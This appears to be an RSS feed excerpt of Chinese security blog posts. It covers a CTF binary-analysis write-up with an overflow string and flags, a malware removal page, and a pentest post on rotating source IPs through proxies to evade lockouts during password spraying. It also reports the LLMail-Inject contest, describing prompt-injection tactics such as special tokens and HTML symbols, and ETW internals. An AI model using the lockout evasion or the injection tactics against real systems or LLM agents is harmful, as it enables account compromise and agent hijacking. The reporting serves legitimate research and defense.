class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 覆盖保存的寄存器&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;eeee&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;后续挑战666和1000个二进制文件&#34;&gt;后续挑战：666和1000个二进制文件
&lt;/h4&gt;&lt;p&gt;同样的方法成功应用于&amp;quot;666 cuts&amp;quot;和&amp;quot;1000 cuts&amp;quot;挑战，证明了该解决方案的通用性。最终获得的标志分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;334 cuts: baby&amp;rsquo;s first crs cirvyudta&lt;/li&gt;
&lt;li&gt;666 cuts: you think this is the real quaid DeifCokIj&lt;/li&gt;
&lt;li&gt;1000 cuts: do you want a thousand bandages gruanfir3&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;binary-ninja的改进空间&#34;&gt;Binary Ninja的改进空间
&lt;/h4&gt;&lt;p&gt;虽然Binary Ninja表现出色，但仍需改进：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;添加SSA（静态单赋值）形式&lt;/li&gt;
&lt;li&gt;实现灵活的类型系统&lt;/li&gt;
&lt;li&gt;增强数据流分析能力&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;结论&#34;&gt;结论
&lt;/h4&gt;&lt;p&gt;从流畅的图形视图到中间语言，再到与Python的智能集成，Binary Ninja为静态二进制分析提供了出色的接口。它让我能够轻松快速地从2000个二进制文件中提取数据，展示了将机械效率与人类直觉相结合的可能性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我的（略微更新的）脚本可在&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/binja-ctf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;获取。Binary Ninja现已公开发售两个版本：商业版（399美元）和个人版（99美元）。本文介绍的脚本使用了仅商业版提供的&amp;quot;无GUI处理&amp;quot;功能。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>AntiVirus.exe恶意程序分析与清除指南</title>
        <link>http://localhost:1313/p/antivirus.exe%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%B8%85%E9%99%A4%E6%8C%87%E5%8D%97/</link>
        <pubDate>Mon, 04 Aug 2025 17:32:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/antivirus.exe%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%B8%85%E9%99%A4%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;antivirusexe-程序信息&#34;&gt;ANTIVIRUS.EXE 程序信息
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;该程序被判定为有害程序&lt;/strong&gt;&lt;br&gt;
此文件已被识别为计算机上不应运行的恶意程序，包含具有误导性、危害性或不受欢迎的程序组件。&lt;/p&gt;
&lt;p&gt;若确认属于恶意软件或潜在有害程序，建议立即下载Malwarebytes并执行免费扫描以检测和清除恶意程序。若操作无效，欢迎在论坛寻求技术协助。&lt;/p&gt;
&lt;h2 id=&#34;技术参数&#34;&gt;技术参数
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;属性&lt;/th&gt;
          &lt;th&gt;值&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;程序名称&lt;/td&gt;
          &lt;td&gt;MainProgram1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;文件名&lt;/td&gt;
          &lt;td&gt;AntiVirus.exe&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;执行命令&lt;/td&gt;
          &lt;td&gt;C:\RM\AntiVirus.exe&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;行为描述&lt;/td&gt;
          &lt;td&gt;通过PowerShell脚本植入，在用户登录Windows时下载额外恶意负载&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;文件位置&lt;/td&gt;
          &lt;td&gt;C:\RM\&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;启动类型&lt;/td&gt;
          &lt;td&gt;通过注册表Run/RunOnce等键值自动启动&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;HijackThis分类&lt;/td&gt;
          &lt;td&gt;O4条目（注册表启动项）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;清除建议&#34;&gt;清除建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;使用专业工具&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下载Malwarebytes执行全盘扫描&lt;/li&gt;
&lt;li&gt;配合AdwCleaner等辅助工具清理残留&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;注册表修复&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定位以下注册表分支检查异常项：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;系统还原&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若系统已创建还原点，建议在安全模式下执行系统还原&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;免责声明&#34;&gt;免责声明
&lt;/h2&gt;&lt;p&gt;操作前请确认具备足够的系统管理能力。修改注册表或终止系统进程可能导致不可预见的系统故障。终止进程前请通过MSCONFIG或注册表验证其属性，避免误杀关键系统进程（如svchost.exe）。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>如何轮换您的源IP地址 - 绕过IP过滤的实用技巧</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E8%BD%AE%E6%8D%A2%E6%82%A8%E7%9A%84%E6%BA%90ip%E5%9C%B0%E5%9D%80-%E7%BB%95%E8%BF%87ip%E8%BF%87%E6%BB%A4%E7%9A%84%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Mon, 04 Aug 2025 17:10:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E8%BD%AE%E6%8D%A2%E6%82%A8%E7%9A%84%E6%BA%90ip%E5%9C%B0%E5%9D%80-%E7%BB%95%E8%BF%87ip%E8%BF%87%E6%BB%A4%E7%9A%84%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;h1 id=&#34;如何轮换您的源ip地址&#34;&gt;如何轮换您的源IP地址
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Darin Roberts&lt;/strong&gt;//&lt;/p&gt;
&lt;h2 id=&#34;ip轮换实战源ip轮换技术&#34;&gt;IP轮换实战——源IP轮换技术
&lt;/h2&gt;&lt;p&gt;在一次渗透测试中，我发现目标系统会根据IP地址阻止我的密码喷洒攻击。如果从一个IP发出3次错误请求，该IP就会被封禁30分钟。虽然这是种有效的安全防护措施，但它并不能阻止有决心的攻击者。&lt;/p&gt;
&lt;p&gt;绕过IP过滤的方法之一就是使用轮换源IP技术。ProxyCannon是个出色的工具，它能自动通过多个云服务器路由流量以实现IP多样化（感谢#_shellIntel）。不过我想找更简单的方案，于是发现了ProxyMesh服务。&lt;/p&gt;
&lt;p&gt;我使用的套餐提供两种代理选项：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;美国本土10个IP的代理&lt;/li&gt;
&lt;li&gt;包含8,743个IP的&amp;quot;开放&amp;quot;代理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ProxyMesh提供多种付费方案，30天免费试用后最低只需10美元/月。本文测试基于10美元套餐完成。&lt;/p&gt;
&lt;h2 id=&#34;配置方法&#34;&gt;配置方法
&lt;/h2&gt;&lt;p&gt;我测试了两种连接方式：&lt;/p&gt;
&lt;h3 id=&#34;方法一chrome的foxyproxy插件&#34;&gt;方法一：Chrome的FoxyProxy插件
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;打开FoxyProxy新建代理&lt;/li&gt;
&lt;li&gt;关键配置（需认证信息）：
&lt;ul&gt;
&lt;li&gt;主机名：open.proxymesh.com&lt;/li&gt;
&lt;li&gt;切换为美国代理只需改为us-wa.proxymesh.com&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法二burp-suite-pro&#34;&gt;方法二：Burp Suite Pro
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;配置代理设置&lt;/li&gt;
&lt;li&gt;故意留空目标主机（会自动添加通配符）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;性能测试&#34;&gt;性能测试
&lt;/h2&gt;&lt;h3 id=&#34;开放代理测试100次请求&#34;&gt;开放代理测试（100次请求）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;错误率：7%（错误请求或超时）&lt;/li&gt;
&lt;li&gt;IP重复率：2%&lt;/li&gt;
&lt;li&gt;耗时：约1.5分钟（5线程）&lt;/li&gt;
&lt;li&gt;地理分布样例：
&lt;ul&gt;
&lt;li&gt;美国：25次&lt;/li&gt;
&lt;li&gt;俄罗斯：10次&lt;/li&gt;
&lt;li&gt;泰国/印尼/巴西：各4次&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;美国代理测试100次请求&#34;&gt;美国代理测试（100次请求）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;零错误&lt;/li&gt;
&lt;li&gt;每个IP重复使用6-14次&lt;/li&gt;
&lt;li&gt;耗时：仅13秒&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;ProxyMesh提供了一种经济高效的IP轮换方案。通过调整线程数可以优化速度（10线程可将耗时降至45秒）。虽然存在少量IP重复和错误，但整体能满足密码喷洒等场景需求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;您用过其他好用的轮换代理工具吗？欢迎分享交流。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>微软自适应提示注入挑战赛（LLMail-Inject）优胜者揭晓</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E8%87%AA%E9%80%82%E5%BA%94%E6%8F%90%E7%A4%BA%E6%B3%A8%E5%85%A5%E6%8C%91%E6%88%98%E8%B5%9Bllmail-inject%E4%BC%98%E8%83%9C%E8%80%85%E6%8F%AD%E6%99%93/</link>
        <pubDate>Mon, 04 Aug 2025 16:53:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E8%87%AA%E9%80%82%E5%BA%94%E6%8F%90%E7%A4%BA%E6%B3%A8%E5%85%A5%E6%8C%91%E6%88%98%E8%B5%9Bllmail-inject%E4%BC%98%E8%83%9C%E8%80%85%E6%8F%AD%E6%99%93/</guid>
        <description>&lt;p&gt;我们激动地宣布LLMail-Inject挑战赛的优胜者！这项首届自适应提示注入防御竞赛于2024年12月至2025年2月举办，并作为第三届IEEE安全可信机器学习会议（IEEE SaTML）的四大官方赛事之一。本次竞赛旨在推动对抗间接提示注入攻击的防御技术发展，并提升行业对该新型攻击手段的认知。我们为研究人员提供了可针对特定防御方案开发和测试新型间接提示注入攻击的平台，所获数据将帮助我们及业界评估现有防御措施并开发更先进的解决方案。&lt;/p&gt;
&lt;h3 id=&#34;竞赛机制&#34;&gt;竞赛机制
&lt;/h3&gt;&lt;p&gt;竞赛模拟了集成LLM的邮件客户端LLMail服务场景，该服务可代用户阅读邮件并执行包括发送邮件在内的操作。参赛者扮演攻击者角色，需构造能诱使用户LLM执行非授权指令的恶意邮件，同时绕过预设的提示注入防御机制。所有防御策略均对攻击者公开，便于参赛者针对性调整攻击方式。&lt;/p&gt;
&lt;p&gt;挑战场景根据上下文窗口中的邮件数量、攻击邮件位置、默认检索状态及数据渗出需求等维度设置不同难度级别。防御方案涵盖：基于文本的分类器（Prompt Shields）、模型隐藏状态分类器（TaskTracker）、LLM自裁决机制、Spotlighting技术以及混合防御策略。每个场景组合均提供microsoft/Phi-3-medium-128k-instruct和具备指令层级训练的GPT-4o-mini两种LLM模型。&lt;/p&gt;
&lt;h3 id=&#34;赛事成果&#34;&gt;赛事成果
&lt;/h3&gt;&lt;p&gt;本届赛事吸引621名注册参与者组成224支团队，累计提交370,724次攻击尝试。目前我们正对完整数据集进行分析，详细技术报告将于数月内发布。&lt;/p&gt;
&lt;h4 id=&#34;优胜团队技术策略&#34;&gt;优胜团队技术策略：
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;总冠军TH3L053R5（@0xSombra）&lt;/strong&gt;&lt;br&gt;
采用迭代式提示构建策略，强调现实攻击中观察LLM输出的重要性，成功破解36个防御层级。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;一等奖Abyss Watchers（趋势科技团队）&lt;/strong&gt;&lt;br&gt;
凭借前期开发提示注入检测的经验优势，针对两种LLM的注意力机制定制攻击方案，同样完成36个层级的突破。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;二等奖Enter a team name&amp;hellip;（Tran Huu Bach）&lt;/strong&gt;&lt;br&gt;
以解谜思维处理挑战，在不依赖深度技术知识的情况下破解35个层级。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;三等奖A helpful assistant（Tsun-Han Chiang）&lt;/strong&gt;&lt;br&gt;
创新性使用特殊标记（如&amp;lt;|end|&amp;gt;）和HTML符号绕过防御，并通过多语言与随机字符干扰提升攻击成功率。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;新挑战启动&#34;&gt;新挑战启动
&lt;/h3&gt;&lt;p&gt;我们已推出进阶赛事Re:LLMail-Inject，重点改进以下防御措施：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新增基于往届攻击的高精度阻断列表&lt;/li&gt;
&lt;li&gt;输入净化处理升级&lt;/li&gt;
&lt;li&gt;LLM自裁决提示优化&lt;/li&gt;
&lt;li&gt;Prompt Shields模型更新&lt;/li&gt;
&lt;li&gt;TaskTracker采用新版LLM&lt;/li&gt;
&lt;li&gt;系统提示词重构以抵抗邮件指令劫持&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本届赛事奖金池6,000美元，诚邀全球研究者继续探索间接提示注入防御的前沿技术。&lt;/p&gt;
&lt;h3 id=&#34;参考文献&#34;&gt;参考文献
&lt;/h3&gt;&lt;p&gt;[1] Azure AI提示防护盾技术&lt;br&gt;
[2]《通过激活检测捕捉LLM任务漂移》&lt;br&gt;
[3]《基于聚光灯效应的间接提示注入防御》&lt;br&gt;
[4]《特权指令优先化的层级训练方法》&lt;/p&gt;
&lt;p&gt;&lt;em&gt;赛事由微软研究院、ISTA、苏黎世联邦理工学院联合举办&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>开源AI威胁建模工具——快速、情境感知且开发者友好</title>
        <link>http://localhost:1313/p/%E5%BC%80%E6%BA%90ai%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1%E5%B7%A5%E5%85%B7%E5%BF%AB%E9%80%9F%E6%83%85%E5%A2%83%E6%84%9F%E7%9F%A5%E4%B8%94%E5%BC%80%E5%8F%91%E8%80%85%E5%8F%8B%E5%A5%BD/</link>
        <pubDate>Mon, 04 Aug 2025 16:31:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BC%80%E6%BA%90ai%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1%E5%B7%A5%E5%85%B7%E5%BF%AB%E9%80%9F%E6%83%85%E5%A2%83%E6%84%9F%E7%9F%A5%E4%B8%94%E5%BC%80%E5%8F%91%E8%80%85%E5%8F%8B%E5%A5%BD/</guid>
        <description>&lt;h1 id=&#34;开源ai威胁建模工具快速情境感知且开发者友好&#34;&gt;开源AI威胁建模工具——快速、情境感知且开发者友好
&lt;/h1&gt;&lt;p&gt;人工智能正在变革各行各业，但随之而来的安全风险也日益复杂。传统安全方法（如STRIDE框架）难以应对AI特有的威胁场景，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;提示注入&lt;/strong&gt;：通过恶意输入操纵生成式AI行为&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;训练数据投毒&lt;/strong&gt;：污染数据集导致模型预测偏差&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模型窃取&lt;/strong&gt;：通过API交互窃取模型参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;组件链风险&lt;/strong&gt;：向量数据库、API网关等组件的协同攻击面&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;工具核心能力&#34;&gt;工具核心能力
&lt;/h2&gt;&lt;p&gt;这款基于Streamlit构建的开源工具通过两阶段工作流实现威胁建模：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;交互式问卷&lt;/strong&gt;&lt;br&gt;
收集AI系统关键信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模型类型（分类/生成/集成）&lt;/li&gt;
&lt;li&gt;数据来源（内部/爬取/用户生成）&lt;/li&gt;
&lt;li&gt;部署模式（SaaS/混合云）&lt;/li&gt;
&lt;li&gt;第三方依赖（开源模型/向量数据库）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;规则引擎&lt;/strong&gt;&lt;br&gt;
基于300+条确定性规则生成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;映射到MITRE ATLAS的攻击战术&lt;/li&gt;
&lt;li&gt;NIST CIA+Abuse分类&lt;/li&gt;
&lt;li&gt;合规缺口提示（GDPR/HIPAA）&lt;/li&gt;
&lt;li&gt;可操作的修复建议（如输入过滤、结构化提示）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术实现&#34;&gt;技术实现
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;前端&lt;/strong&gt;：Streamlit构建的渐进式问卷&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;后端&lt;/strong&gt;：Python规则引擎，示例规则逻辑：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;match&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;unfiltered_user_input&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;llm_used&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;threat&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;用户输入导致的提示注入&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;mitre_atlas&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Prompt Injection&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;mitigations&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;输入消毒&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;结构化提示&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;适用场景&#34;&gt;适用场景
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;开发中的AI系统架构评审&lt;/li&gt;
&lt;li&gt;安全团队评估LLM应用风险&lt;/li&gt;
&lt;li&gt;产品经理向管理层解释AI风险&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;项目已在GitHub开源，支持本地部署：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install -r requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;streamlit run main.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;未来版本计划集成OWASP LLM Top 10威胁图谱和团队协作功能。开发者可通过提交PR扩展威胁规则库，共同构建更安全的AI生态。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入探索ETW内部机制：安全研究与取证的关键技术</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2etw%E5%86%85%E9%83%A8%E6%9C%BA%E5%88%B6%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%8F%96%E8%AF%81%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Mon, 04 Aug 2025 16:15:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2etw%E5%86%85%E9%83%A8%E6%9C%BA%E5%88%B6%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%8F%96%E8%AF%81%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;etw内部机制与安全研究取证&#34;&gt;ETW内部机制与安全研究取证
&lt;/h1&gt;&lt;h2 id=&#34;etw概述&#34;&gt;ETW概述
&lt;/h2&gt;&lt;p&gt;Windows事件追踪(ETW)已成为Windows 10/11端点检测响应(EDR)解决方案的核心组件。其价值在于通过安全ETW通道为安全工具提供智能数据，这也使其成为攻击者试图绕过检测的主要目标。&lt;/p&gt;
&lt;p&gt;ETW主要由两个组件构成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;提供者(Providers)&lt;/strong&gt;：向ETW GUID发送事件，事件会被写入文件、内存缓冲区或两者&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;消费者(Consumers)&lt;/strong&gt;：从单个或多个提供者接收事件的追踪日志会话&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过&lt;code&gt;logman query providers&lt;/code&gt;命令可查看系统注册的提供者（通常有上千个），每个ETW提供者在清单文件中定义自己的事件类型。&lt;/p&gt;
&lt;h2 id=&#34;寻找etw消费者进程&#34;&gt;寻找ETW消费者进程
&lt;/h2&gt;&lt;p&gt;通过性能监视器可查看所有运行的ETW消费者会话，但获取接收事件的进程列表更为复杂。我们采用WinDbg内核调试会话来深入分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用JavaScript脚本扫描所有进程的句柄表，查找&lt;code&gt;EtwConsumer&lt;/code&gt;对象&lt;/li&gt;
&lt;li&gt;获取关联的&lt;code&gt;ETW_REALTIME_CONSUMER&lt;/code&gt;结构并提取&lt;code&gt;LoggerId&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;WMI_LOGGER_CONTEXT&lt;/code&gt;结构数组匹配日志会话名称&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
